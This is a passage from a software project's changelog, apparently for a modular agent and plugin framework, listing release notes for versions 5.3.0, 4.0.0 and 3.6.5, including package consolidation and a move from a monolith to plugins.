- create-trd: Addressed code review findings M-1 and M-2.
- version-manager: Widened commit message character allowlist.

### Removed

- `agent-progress-pane` and `task-progress-pane` packages (consolidated).

## [5.3.0] - 2026-02-17

### Added

- Initial 5.x release series with 23 packages, 28 agents, and 4-tier architecture.
- See git history for detailed changes from 4.0.0 to 5.3.0.

## [4.0.0] - 2025-12-09

### Added

- Modular plugin architecture replacing the v3.x monolith.
- 20 specialized plugins organized across core, workflow, framework, and testing layers.
- Plugin dependency resolution and marketplace integration.
- NPM workspace support, validation schemas, CI workflows, and publishing automation.

### Changed

- Installation moved from a single monolith to modular plugin installs.
- Plugin names now use the `ensemble-` prefix and `@sunstone-partners/` npm scope.
- Installation size and plugin load time were significantly reduced through modularization.

## [3.6.5]

### Changed

- Last release before the v4 plugin architecture migration.
- See the v3.x branch for the pre-plugin changelog history.
